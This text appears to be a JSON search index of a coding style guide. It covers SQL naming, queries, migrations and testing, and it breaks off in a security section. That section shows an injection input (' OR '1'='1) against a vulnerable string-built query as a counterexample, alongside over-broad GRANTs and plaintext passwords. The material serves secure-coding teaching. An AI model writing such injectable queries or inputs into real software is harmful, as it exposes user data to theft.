</ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#see-also","title":"See Also","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#related-language-guides","title":"Related Language Guides","text":"<ul> <li>TypeScript Style Guide - Modern type-safe programming</li> <li>Bash Style Guide - Shell scripting for automation</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#development-tools-practices","title":"Development Tools &amp; Practices","text":"<ul> <li>IDE Integration Guide - VS Code, PyCharm setup</li> <li>Pre-commit Hooks Guide - Automated validation</li> <li>Local Validation Setup - Development environment</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#testing-quality","title":"Testing &amp; Quality","text":"<ul> <li>Testing Strategies - pytest patterns and best practices</li> <li>Security Scanning Guide - Bandit, Safety integration</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#cicd-integration","title":"CI/CD Integration","text":"<ul> <li>GitHub Actions Guide - Python workflow examples</li> <li>GitLab CI Guide - Pipeline configuration</li> <li>AI Validation Pipeline - Automated code review</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#templates-examples","title":"Templates &amp; Examples","text":"<ul> <li>Python Package Template - Project structure</li> <li>Python Package Example - Complete implementation</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#core-documentation","title":"Core Documentation","text":"<ul> <li>Getting Started Guide - Repository setup</li> <li>Metadata Schema Reference - Frontmatter requirements</li> <li>Principles - Style guide philosophy</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/sql/","title":"SQL Style Guide","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#language-overview","title":"Language Overview","text":"<p>SQL (Structured Query Language) is a declarative language for managing and querying relational databases. This guide provides database-agnostic standards that work across PostgreSQL, MySQL, SQL Server, and other SQL-compliant databases.</p>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Declarative query language</li> <li>Case Sensitivity: Varies by database (PostgreSQL case-sensitive, MySQL configurable)</li> <li>Standards: SQL-92, SQL:1999, SQL:2003, SQL:2011</li> <li>Primary Use: Data querying, manipulation, and schema definition</li> </ul>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#naming-conventions","title":"Naming Conventions","text":"<pre><code>-- UPPERCASE keywords, lowercase identifiers\nSELECT user_id, email, created_at\nFROM users\nWHERE status = 'active';\n\n-- Avoid mixed case or all lowercase keywords\n-- Bad\nselect user_id from users where status = 'active';\n\n-- Bad\nSelect User_Id From Users Where Status = 'active';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Keywords <code>UPPERCASE</code> <code>SELECT</code>, <code>FROM</code>, <code>WHERE</code> All SQL keywords uppercase Tables <code>snake_case</code> <code>users</code>, <code>order_items</code> Plural nouns, lowercase Columns <code>snake_case</code> <code>user_id</code>, <code>created_at</code> Descriptive, lowercase Indexes <code>idx_table_columns</code> <code>idx_users_email</code> Prefix with <code>idx_</code> Primary Keys <code>id</code> or <code>table_id</code> <code>id</code>, <code>user_id</code> Singular, descriptive Foreign Keys <code>table_id</code> <code>user_id</code>, <code>product_id</code> Reference table name Constraints <code>pk_</code>, <code>fk_</code>, <code>uk_</code>, <code>ck_</code> <code>pk_users</code>, <code>fk_orders_user_id</code> Prefix by type Views <code>v_descriptive_name</code> <code>v_active_users</code> Prefix with <code>v_</code> Formatting Indentation 2 or 4 spaces <code>WHERE status = 'active'</code> Consistent indentation Line Breaks One clause per line <code>SELECT\\n  column\\nFROM</code> Readable queries Commas Leading commas <code>, column2\\n, column3</code> Or trailing (be consistent) Query Structure SELECT Explicit columns <code>SELECT id, name</code> Avoid <code>SELECT *</code> JOIN Explicit JOIN type <code>INNER JOIN</code>, <code>LEFT JOIN</code> Not implicit joins WHERE Use bind parameters <code>WHERE id = $1</code> Prevent SQL injection Best Practices Comments <code>--</code> for line <code>-- Get active users</code> Single-line comments Transactions Use when needed <code>BEGIN; ... COMMIT;</code> Atomic operations NULL Handling Explicit NULL checks <code>WHERE col IS NULL</code> Not <code>= NULL</code>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#keywords-and-identifiers","title":"Keywords and Identifiers","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#sql-keywords","title":"SQL Keywords","text":"<p>Use UPPERCASE for all SQL keywords:</p> <pre><code>SELECT, FROM, WHERE, JOIN, LEFT JOIN, INNER JOIN, ON, AND, OR, NOT,\nINSERT, UPDATE, DELETE, CREATE, DROP, ALTER, TABLE, INDEX, VIEW,\nORDER BY, GROUP BY, HAVING, DISTINCT, AS, UNION, INTERSECT, EXCEPT,\nWITH, CASE, WHEN, THEN, ELSE, END, NULL, IS, LIKE, IN, BETWEEN\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#identifiers","title":"Identifiers","text":"<p>Use lowercase snake_case for all identifiers:</p> <pre><code>-- Tables\nusers, user_profiles, order_items, payment_transactions\n\n-- Columns\nuser_id, first_name, email_address, created_at, is_active\n\n-- Indexes\nidx_users_email, idx_orders_user_id_created_at\n\n-- Constraints\npk_users, fk_orders_user_id, uniq_users_email\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#table-design","title":"Table Design","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#table-naming","title":"Table Naming","text":"<pre><code>-- Good - plural nouns, lowercase snake_case\nCREATE TABLE users (\n    user_id BIGINT PRIMARY KEY,\n    email VARCHAR(255) NOT NULL,\n    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE TABLE order_items (\n    order_item_id BIGINT PRIMARY KEY,\n    order_id BIGINT NOT NULL,\n    product_id BIGINT NOT NULL,\n    quantity INT NOT NULL\n);\n\n-- Avoid singular or mixed case\n-- Bad\nCREATE TABLE User (...);\nCREATE TABLE OrderItem (...);\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#primary-keys","title":"Primary Keys","text":"<pre><code>-- Prefer surrogate keys with table_name + _id pattern\nCREATE TABLE users (\n    user_id BIGSERIAL PRIMARY KEY,\n    email VARCHAR(255) NOT NULL UNIQUE,\n    username VARCHAR(100) NOT NULL UNIQUE\n);\n\n-- Composite primary keys for junction tables\nCREATE TABLE user_roles (\n    user_id BIGINT NOT NULL,\n    role_id BIGINT NOT NULL,\n    assigned_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,\n    PRIMARY KEY (user_id, role_id)\n);\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#foreign-keys","title":"Foreign Keys","text":"<pre><code>CREATE TABLE orders (\n    order_id BIGSERIAL PRIMARY KEY,\n    user_id BIGINT NOT NULL,\n    status VARCHAR(50) NOT NULL,\n    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,\n\n    CONSTRAINT fk_orders_user_id\n        FOREIGN KEY (user_id)\n        REFERENCES users(user_id)\n        ON DELETE CASCADE\n);\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#indexes","title":"Indexes","text":"<pre><code>-- Index naming: idx_table_column[_column...]\nCREATE INDEX idx_users_email ON users(email);\nCREATE INDEX idx_orders_user_id ON orders(user_id);\nCREATE INDEX idx_orders_status_created_at ON orders(status, created_at);\n\n-- Unique indexes\nCREATE UNIQUE INDEX uniq_users_email ON users(email);\nCREATE UNIQUE INDEX uniq_users_username ON users(username);\n\n-- Partial indexes (PostgreSQL)\nCREATE INDEX idx_orders_active\n    ON orders(user_id, created_at)\n    WHERE status = 'active';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#query-formatting","title":"Query Formatting","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#select-statements","title":"SELECT Statements","text":"<pre><code>-- One column per line for complex queries\nSELECT\n    u.user_id,\n    u.email,\n    u.first_name,\n    u.last_name,\n    u.created_at,\n    COUNT(o.order_id) AS order_count\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id\nWHERE u.status = 'active'\n    AND u.created_at &gt;= '2024-01-01'\nGROUP BY u.user_id, u.email, u.first_name, u.last_name, u.created_at\nHAVING COUNT(o.order_id) &gt; 0\nORDER BY order_count DESC, u.created_at DESC\nLIMIT 100;\n\n-- Simple queries on one line\nSELECT user_id, email FROM users WHERE status = 'active';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#join-conventions","title":"JOIN Conventions","text":"<pre><code>-- Use explicit JOIN syntax (not implicit with WHERE)\n-- Good\nSELECT u.user_id, u.email, o.order_id\nFROM users u\nINNER JOIN orders o ON u.user_id = o.user_id;\n\n-- Bad - implicit join\nSELECT u.user_id, u.email, o.order_id\nFROM users u, orders o\nWHERE u.user_id = o.user_id;\n\n-- JOIN types\n-- INNER JOIN - matching rows only\nSELECT u.email, o.total\nFROM users u\nINNER JOIN orders o ON u.user_id = o.user_id;\n\n-- LEFT JOIN - all left rows, matched right rows\nSELECT u.email, o.total\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id;\n\n-- Multiple JOINs\nSELECT\n    u.email,\n    o.order_id,\n    oi.product_id,\n    p.product_name\nFROM users u\nINNER JOIN orders o ON u.user_id = o.user_id\nINNER JOIN order_items oi ON o.order_id = oi.order_id\nINNER JOIN products p ON oi.product_id = p.product_id\nWHERE o.status = 'completed';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#common-table-expressions-ctes","title":"Common Table Expressions (CTEs)","text":"<pre><code>-- Use CTEs for complex queries\nWITH active_users AS (\n    SELECT user_id, email, created_at\n    FROM users\n    WHERE status = 'active'\n),\nuser_orders AS (\n    SELECT\n        user_id,\n        COUNT(*) AS order_count,\n        SUM(total) AS total_spent\n    FROM orders\n    WHERE status = 'completed'\n    GROUP BY user_id\n)\nSELECT\n    au.user_id,\n    au.email,\n    COALESCE(uo.order_count, 0) AS order_count,\n    COALESCE(uo.total_spent, 0) AS total_spent\nFROM active_users au\nLEFT JOIN user_orders uo ON au.user_id = uo.user_id\nORDER BY uo.total_spent DESC NULLS LAST;\n\n-- Recursive CTE example\nWITH RECURSIVE employee_hierarchy AS (\n    -- Base case\n    SELECT\n        employee_id,\n        manager_id,\n        name,\n        1 AS level\n    FROM employees\n    WHERE manager_id IS NULL\n\n    UNION ALL\n\n    -- Recursive case\n    SELECT\n        e.employee_id,\n        e.manager_id,\n        e.name,\n        eh.level + 1\n    FROM employees e\n    INNER JOIN employee_hierarchy eh ON e.manager_id = eh.employee_id\n)\nSELECT * FROM employee_hierarchy ORDER BY level, name;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#insert-update-delete","title":"INSERT, UPDATE, DELETE","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#insert","title":"INSERT","text":"<pre><code>-- Single row insert\nINSERT INTO users (email, first_name, last_name)\nVALUES ('user@example.com', 'John', 'Doe');\n\n-- Multiple row insert\nINSERT INTO users (email, first_name, last_name)\nVALUES\n    ('user1@example.com', 'Alice', 'Smith'),\n    ('user2@example.com', 'Bob', 'Jones'),\n    ('user3@example.com', 'Charlie', 'Brown');\n\n-- INSERT with SELECT\nINSERT INTO user_audit (user_id, action, created_at)\nSELECT user_id, 'login', CURRENT_TIMESTAMP\nFROM users\nWHERE last_login &lt; CURRENT_DATE - INTERVAL '30 days';\n\n-- UPSERT (PostgreSQL)\nINSERT INTO user_preferences (user_id, theme, language)\nVALUES (1, 'dark', 'en')\nON CONFLICT (user_id)\nDO UPDATE SET\n    theme = EXCLUDED.theme,\n    language = EXCLUDED.language,\n    updated_at = CURRENT_TIMESTAMP;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#update","title":"UPDATE","text":"<pre><code>-- Always use WHERE clause\nUPDATE users\nSET\n    status = 'inactive',\n    updated_at = CURRENT_TIMESTAMP\nWHERE last_login &lt; CURRENT_DATE - INTERVAL '90 days';\n\n-- UPDATE with JOIN\nUPDATE orders o\nSET status = 'cancelled'\nFROM users u\nWHERE o.user_id = u.user_id\n    AND u.status = 'deleted'\n    AND o.status = 'pending';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#delete","title":"DELETE","text":"<pre><code>-- Always use WHERE clause (unless intentional truncation)\nDELETE FROM sessions\nWHERE expires_at &lt; CURRENT_TIMESTAMP;\n\n-- DELETE with JOIN\nDELETE FROM orders\nWHERE user_id IN (\n    SELECT user_id\n    FROM users\n    WHERE status = 'deleted'\n);\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#transactions","title":"Transactions","text":"<pre><code>-- Explicit transaction control\nBEGIN;\n\nUPDATE accounts\nSET balance = balance - 100.00\nWHERE account_id = 1;\n\nUPDATE accounts\nSET balance = balance + 100.00\nWHERE account_id = 2;\n\n-- Verify constraints\nSELECT balance FROM accounts WHERE account_id IN (1, 2);\n\nCOMMIT;\n\n-- Rollback on error\nBEGIN;\n\nUPDATE inventory SET quantity = quantity - 5 WHERE product_id = 100;\n\n-- Check if enough inventory\nSELECT quantity FROM inventory WHERE product_id = 100;\n\n-- If quantity &lt; 0, rollback\nROLLBACK;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#functions-and-stored-procedures","title":"Functions and Stored Procedures","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#functions-postgresql","title":"Functions (PostgreSQL)","text":"<pre><code>-- Function to calculate order total\nCREATE OR REPLACE FUNCTION calculate_order_total(p_order_id BIGINT)\nRETURNS NUMERIC AS $$\nDECLARE\n    v_total NUMERIC;\nBEGIN\n    SELECT SUM(quantity * unit_price)\n    INTO v_total\n    FROM order_items\n    WHERE order_id = p_order_id;\n\n    RETURN COALESCE(v_total, 0);\nEND;\n$$ LANGUAGE plpgsql;\n\n-- Usage\nSELECT order_id, calculate_order_total(order_id) AS total\nFROM orders;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#stored-procedures-postgresql-11","title":"Stored Procedures (PostgreSQL 11+)","text":"<pre><code>CREATE OR REPLACE PROCEDURE close_expired_orders()\nLANGUAGE plpgsql\nAS $$\nBEGIN\n    UPDATE orders\n    SET\n        status = 'expired',\n        updated_at = CURRENT_TIMESTAMP\n    WHERE status = 'pending'\n        AND created_at &lt; CURRENT_TIMESTAMP - INTERVAL '7 days';\n\n    -- Log the operation\n    INSERT INTO audit_log (action, affected_rows, created_at)\n    VALUES ('close_expired_orders', ROW_COUNT(), CURRENT_TIMESTAMP);\n\n    COMMIT;\nEND;\n$$;\n\n-- Execute procedure\nCALL close_expired_orders();\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#views","title":"Views","text":"<pre><code>-- Create view for commonly accessed data\nCREATE VIEW active_user_orders AS\nSELECT\n    u.user_id,\n    u.email,\n    o.order_id,\n    o.total,\n    o.status,\n    o.created_at\nFROM users u\nINNER JOIN orders o ON u.user_id = o.user_id\nWHERE u.status = 'active'\n    AND o.status IN ('pending', 'processing', 'shipped');\n\n-- Materialized view (PostgreSQL)\nCREATE MATERIALIZED VIEW user_order_summary AS\nSELECT\n    u.user_id,\n    u.email,\n    COUNT(o.order_id) AS total_orders,\n    SUM(o.total) AS total_spent,\n    MAX(o.created_at) AS last_order_date\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id\nWHERE o.status = 'completed'\nGROUP BY u.user_id, u.email;\n\n-- Refresh materialized view\nREFRESH MATERIALIZED VIEW user_order_summary;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#migration-scripts","title":"Migration Scripts","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#schema-migrations","title":"Schema Migrations","text":"<pre><code>-- migration_001_create_users_table.sql\n-- @module users_table_migration\n-- @description Create users table with indexes\n-- @version 1.0.0\n-- @author Tyler Dukes\n-- @last_updated 2025-10-28\n\nBEGIN;\n\nCREATE TABLE users (\n    user_id BIGSERIAL PRIMARY KEY,\n    email VARCHAR(255) NOT NULL,\n    password_hash VARCHAR(255) NOT NULL,\n    first_name VARCHAR(100),\n    last_name VARCHAR(100),\n    status VARCHAR(50) NOT NULL DEFAULT 'active',\n    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE UNIQUE INDEX uniq_users_email ON users(email);\nCREATE INDEX idx_users_status ON users(status);\nCREATE INDEX idx_users_created_at ON users(created_at);\n\nCOMMIT;\n\n-- Rollback script: migration_001_rollback.sql\nBEGIN;\nDROP TABLE IF EXISTS users CASCADE;\nCOMMIT;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#data-migrations","title":"Data Migrations","text":"<pre><code>-- migration_002_populate_default_roles.sql\nBEGIN;\n\nINSERT INTO roles (role_name, description)\nVALUES\n    ('admin', 'System administrator'),\n    ('user', 'Regular user'),\n    ('guest', 'Guest user')\nON CONFLICT (role_name) DO NOTHING;\n\nCOMMIT;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#query-optimization","title":"Query Optimization","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#use-indexes-effectively","title":"Use Indexes Effectively","text":"<pre><code>-- Bad - Full table scan\nSELECT * FROM users WHERE LOWER(email) = 'user@example.com';\n\n-- Good - Index-friendly query\nSELECT * FROM users WHERE email = 'user@example.com';\n\n-- Create functional index if needed\nCREATE INDEX idx_users_email_lower ON users(LOWER(email));\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-select","title":"Avoid SELECT *","text":"<pre><code>-- Bad - Retrieves unnecessary data\nSELECT * FROM users WHERE user_id = 1;\n\n-- Good - Specify only needed columns\nSELECT user_id, email, first_name, last_name\nFROM users\nWHERE user_id = 1;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#use-explain","title":"Use EXPLAIN","text":"<pre><code>-- Analyze query performance\nEXPLAIN ANALYZE\nSELECT u.email, COUNT(o.order_id) AS order_count\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id\nWHERE u.created_at &gt;= '2024-01-01'\nGROUP BY u.email\nHAVING COUNT(o.order_id) &gt; 5;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#testing","title":"Testing","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#sql-linting","title":"SQL Linting","text":"<p>Use sqlfluff to lint SQL files:</p> <pre><code>## Install sqlfluff\npip install sqlfluff\n\n## Lint SQL files\nsqlfluff lint queries/*.sql\n\n## Auto-fix issues\nsqlfluff fix queries/*.sql\n\n## Lint with specific dialect\nsqlfluff lint --dialect postgres queries/*.sql\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#unit-testing-with-pgtap","title":"Unit Testing with pgTAP","text":"<p>Test PostgreSQL schemas and functions:</p> <pre><code>## tests/schema_test.sql\nBEGIN;\n\nSELECT plan(5);\n\n-- Test table exists\nSELECT has_table('users', 'users table should exist');\n\n-- Test columns\nSELECT has_column('users', 'id', 'users should have id column');\nSELECT has_column('users', 'email', 'users should have email column');\n\n-- Test constraints\nSELECT has_pk('users', 'users should have primary key');\n\n-- Test index\nSELECT has_index('users', 'idx_users_email', 'email index should exist');\n\nSELECT * FROM finish();\nROLLBACK;\n</code></pre> <p>Run with:</p> <pre><code>pg_prove -d testdb tests/*.sql\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#testing-with-sqlite","title":"Testing with SQLite","text":"<p>Simple SQL tests:</p> <pre><code>## tests/test_queries.sh\n#!/bin/bash\n\n## Create test database\nsqlite3 test.db &lt; schema.sql\n\n## Test query results\nresult=$(sqlite3 test.db \"SELECT COUNT(*) FROM users;\")\nif [ \"$result\" != \"0\" ]; then\n  echo \"FAIL: Expected 0 users\"\n  exit 1\nfi\n\n## Insert test data\nsqlite3 test.db \"INSERT INTO users (name, email) VALUES ('Test', 'test@example.com');\"\n\n## Verify insertion\nresult=$(sqlite3 test.db \"SELECT COUNT(*) FROM users WHERE email='test@example.com';\")\nif [ \"$result\" != \"1\" ]; then\n  echo \"FAIL: User not inserted correctly\"\n  exit 1\nfi\n\necho \"All SQL tests passed\"\nrm test.db\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#integration-testing","title":"Integration Testing","text":"<p>Test SQL in application context:</p> <pre><code>## tests/test_database.py\nimport pytest\nimport psycopg2\n\n@pytest.fixture\ndef db_connection():\n    conn = psycopg2.connect(\n        host='localhost',\n        database='test_db',\n        user='test_user',\n        password='test_pass'\n    )\n    yield conn\n    conn.close()\n\ndef test_user_creation(db_connection):\n    cursor = db_connection.cursor()\n\n    # Execute SQL\n    cursor.execute(\"\"\"\n        INSERT INTO users (name, email)\n        VALUES ('Test User', 'test@example.com')\n        RETURNING id;\n    \"\"\")\n\n    user_id = cursor.fetchone()[0]\n    assert user_id is not None\n\n    # Verify\n    cursor.execute(\"SELECT email FROM users WHERE id = %s\", (user_id,))\n    email = cursor.fetchone()[0]\n    assert email == 'test@example.com'\n\n    db_connection.rollback()\n\ndef test_query_performance(db_connection):\n    import time\n\n    cursor = db_connection.cursor()\n\n    start = time.time()\n    cursor.execute(\"SELECT * FROM large_table WHERE indexed_column = 'value'\")\n    duration = time.time() - start\n\n    assert duration &lt; 1.0, f\"Query too slow: {duration}s\"\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#testing-migrations","title":"Testing Migrations","text":"<p>Test database migrations:</p> <pre><code>## tests/test_migrations.sh\n#!/bin/bash\nset -e\n\n## Apply migrations\npsql -d test_db -f migrations/001_create_users.sql\npsql -d test_db -f migrations/002_add_users_email_index.sql\n\n## Verify schema\nresult=$(psql -d test_db -t -c \"SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users';\")\nif [ \"$result\" != \"1\" ]; then\n  echo \"FAIL: users table not created\"\n  exit 1\nfi\n\n## Verify index\nresult=$(psql -d test_db -t -c \"SELECT COUNT(*) FROM pg_indexes WHERE indexname='idx_users_email';\")\nif [ \"$result\" != \"1\" ]; then\n  echo \"FAIL: email index not created\"\n  exit 1\nfi\n\necho \"Migration tests passed\"\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#testing-with-docker","title":"Testing with Docker","text":"<p>Test SQL in isolated environment:</p> <pre><code>## docker-compose.test.yml\nversion: '3.8'\n\nservices:\n  postgres:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_DB: test_db\n      POSTGRES_USER: test_user\n      POSTGRES_PASSWORD: test_pass\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U test_user\"]\n      interval: 5s\n      timeout: 3s\n      retries: 5\n\n  test:\n    image: postgres:15-alpine\n    depends_on:\n      postgres:\n        condition: service_healthy\n    volumes:\n      - ./tests:/tests\n      - ./sql:/sql\n    environment:\n      PGHOST: postgres\n      PGDATABASE: test_db\n      PGUSER: test_user\n      PGPASSWORD: test_pass\n    command: &gt;\n      sh -c \"\n        psql -f /sql/schema.sql &amp;&amp;\n        psql -f /sql/seed.sql &amp;&amp;\n        pg_prove /tests/*.sql\n      \"\n</code></pre> <p>Run tests:</p> <pre><code>docker-compose -f docker-compose.test.yml up --abort-on-container-exit\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#query-plan-testing","title":"Query Plan Testing","text":"<p>Test query performance:</p> <pre><code>-- Explain query plan\nEXPLAIN ANALYZE\nSELECT u.name, o.total\nFROM users u\nJOIN orders o ON u.id = o.user_id\nWHERE u.created_at &gt; '2024-01-01';\n\n-- Test index usage\nEXPLAIN (FORMAT JSON)\nSELECT * FROM users WHERE email = 'test@example.com';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#cicd-integration","title":"CI/CD Integration","text":"<pre><code>## .github/workflows/sql-test.yml\nname: SQL Tests\n\non: [push, pull_request]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n\n    services:\n      postgres:\n        image: postgres:15\n        env:\n          POSTGRES_DB: test_db\n          POSTGRES_USER: test_user\n          POSTGRES_PASSWORD: test_pass\n        options: &gt;-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install sqlfluff\n        run: pip install sqlfluff\n\n      - name: Lint SQL\n        run: sqlfluff lint --dialect postgres sql/*.sql\n\n      - name: Run migrations\n        env:\n          PGHOST: localhost\n          PGDATABASE: test_db\n          PGUSER: test_user\n          PGPASSWORD: test_pass\n        run: |\n          for file in migrations/*.sql; do\n            psql -f \"$file\"\n          done\n\n      - name: Run tests\n        env:\n          PGHOST: localhost\n          PGDATABASE: test_db\n          PGUSER: test_user\n          PGPASSWORD: test_pass\n        run: |\n          psql -c \"SELECT version();\"\n          psql -f tests/test_schema.sql\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#coverage-testing","title":"Coverage Testing","text":"<p>Test query coverage:</p> <pre><code>-- Record queries executed\nCREATE TABLE IF NOT EXISTS query_log (\n    id SERIAL PRIMARY KEY,\n    query_text TEXT,\n    executed_at TIMESTAMP DEFAULT NOW()\n);\n\n-- Enable query logging (PostgreSQL)\nALTER SYSTEM SET log_statement = 'all';\nSELECT pg_reload_conf();\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#security-best-practices","title":"Security Best Practices","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#sql-injection-prevention","title":"SQL Injection Prevention","text":"<p>Always use parameterized queries; never concatenate user input into SQL.</p> <pre><code>-- NEVER DO THIS - Vulnerable to SQL injection\n-- Python example showing the vulnerability\nquery = f\"SELECT * FROM users WHERE email = '{user_email}'\"  -- DANGEROUS!\n-- Attacker input: \"' OR '1'='1\" exposes all data\n\n-- ALWAYS USE - Parameterized queries (Python example)\nquery = \"SELECT * FROM users WHERE email = %s\"\ncursor.execute(query, (user_email,))  -- Safe - parameters are escaped\n\n-- ALWAYS USE - Prepared statements (Node.js example)\nconst query = 'SELECT * FROM users WHERE email = $1';\nawait client.query(query, [userEmail]);  -- Safe\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#access-control-and-least-privilege","title":"Access Control and Least Privilege","text":"<p>Grant minimum necessary permissions to database users.</p> <pre><code>-- Bad - Granting excessive permissions\nGRANT ALL PRIVILEGES ON DATABASE myapp TO app_user;  -- Too broad!\nGRANT SUPER ON *.* TO app_user@'%';  -- NEVER grant SUPER!\n\n-- Good - Minimal permissions for application user\nCREATE USER 'app_user'@'localhost' IDENTIFIED BY 'SecurePassword123!';\n\nGRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';\nGRANT SELECT, INSERT, UPDATE ON myapp.orders TO 'app_user'@'localhost';\nGRANT EXECUTE ON PROCEDURE myapp.process_order TO 'app_user'@'localhost';\n\n-- Good - Read-only user for reporting\nCREATE USER 'report_user'@'localhost' IDENTIFIED BY 'SecurePassword456!';\nGRANT SELECT ON myapp.* TO 'report_user'@'localhost';\n\n-- Good - Revoke dangerous permissions\nREVOKE FILE, SUPER, PROCESS ON *.* FROM 'app_user'@'localhost';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#data-encryption","title":"Data Encryption","text":"<p>Encrypt sensitive data at rest and in transit.</p> <pre><code>-- Bad - Storing passwords in plain text\nCREATE TABLE users (\n    user_id INT PRIMARY KEY,\n    email VARCHAR(255),\n    password VARCHAR(255)  -- NEVER store passwords in plain text!\n);\n\nINSERT INTO users (user_id, email, password)\nVALUES (1, 'user@example.com', 'Password123');  -- Exposed!\n\n-- Good - Use application-level hashing (bcrypt, argon2)\n-- Store only hashed passwords\nCREATE TABLE users (\n    user_id INT PRIMARY KEY,\n    email VARCHAR(255) UNIQUE NOT NULL,\n    password_hash VARCHAR(255) NOT NULL,  -- Hashed password\n    password_salt VARCHAR(255) NOT NULL,  -- Unique salt\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Good - Encrypt sensitive columns (PostgreSQL example)\nCREATE EXTENSION IF NOT EXISTS pgcrypto;\n\nCREATE TABLE sensitive_data (\n    id SERIAL PRIMARY KEY,\n    user_id INT NOT NULL,\n    ssn_encrypted BYTEA,  -- Encrypted column\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Insert encrypted data\nINSERT INTO sensitive_data (user_id, ssn_encrypted)\nVALUES (1, pgp_sym_encrypt('123-45-6789', 'encryption_key'));\n\n-- Query encrypted data\nSELECT user_id, pgp_sym_decrypt(ssn_encrypted, 'encryption_key') AS ssn\nFROM sensitive_data\nWHERE user_id = 1;\n\n-- Good - Enable SSL/TLS for connections\n-- In postgresql.conf:\n-- ssl = on\n-- ssl_cert_file = 